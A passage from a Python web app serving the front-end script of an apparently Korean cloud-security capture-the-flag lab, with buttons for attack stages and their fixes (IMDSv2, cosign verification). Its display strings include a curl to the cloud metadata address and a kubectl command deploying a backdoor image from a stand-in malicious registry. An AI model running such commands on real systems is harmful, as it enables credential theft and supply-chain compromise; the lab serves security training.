          appendTerm("curl -s http://169.254.169.254/...", `[-] FAIL: ${data.detail}`);
          alert(`[실패] ${data.detail}`);
        }
      } catch (e) { alert(e.message); }
    }

    async function enforceIMDSv2() {
      const res = await fetch('/api/stage3/enforce-imdsv2', {method: 'POST'});
      const data = await res.json();
      appendTerm("aws ec2 modify-instance-metadata-options --http-tokens required --http-put-response-hop-limit 1", data.message);
      alert(data.message);
    }

    async function deployUntrusted() {
      try {
        const res = await fetch('/api/stage4/deploy-untrusted-image', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({image_url: 'registry.malicious.io/supplychain/backdoor:v1'})
        });
        const data = await res.json();
        if (res.ok) {
          appendTerm("kubectl run malicious-backdoor --image=registry.malicious.io/supplychain/backdoor:v1", `[+] DEPLOYMENT SUCCEEDED (Signature Check Bypassed)!\n[+] FLAG: ${data.flag}`);
          alert(`[Stage 4 성공!] 악성 백도어 이미지 배포 성공!\n플래그: ${data.flag}`);
          updateStatus();
        } else {
          appendTerm("kubectl run malicious-backdoor ...", `[-] FAIL: ${data.detail}`);
          alert(`[실패] ${data.detail}`);
        }
      } catch (e) { alert(e.message); }
    }

    async function enableCosign() {
      const res = await fetch('/api/stage4/enable-cosign-webhook', {method: 'POST'});
      const data = await res.json();
      appendTerm("kubectl apply -f kyverno-cosign-verify.yaml", data.message);
      alert(data.message);
    }

    async function submitFlag() {
      const flagInput = document.getElementById('flagInput');
      const val = flagInput.value.trim();
      const resultBox = document.getElementById('flagResult');
      if (!val) return;
      try {
        const res = await fetch('/api/submit-flag', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({flag: val})
        });
        const data = await res.json();
        resultBox.style.display = 'block';
        if (data.success) {
          resultBox.className = 'flag-result success';
          resultBox.innerText = data.message;
          updateStatus();
        } else {
          resultBox.className = 'flag-result error';
          resultBox.innerText = data.message;
        }
      } catch (err) {
        resultBox.className = 'flag-result error';
        resultBox.innerText = err.message;
      }
    }

    async function resetLab() {
      if (!confirm('랩을 초기 상태로 리셋하시겠습니까?')) return;
      const res = await fetch('/api/reset', {method: 'POST'});
      const data = await res.json();
      alert(data.message);
      updateStatus();
    }

    updateStatus();
  </script>
</body>
</html>
"""
    return HTMLResponse(content=html_content)


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8017)
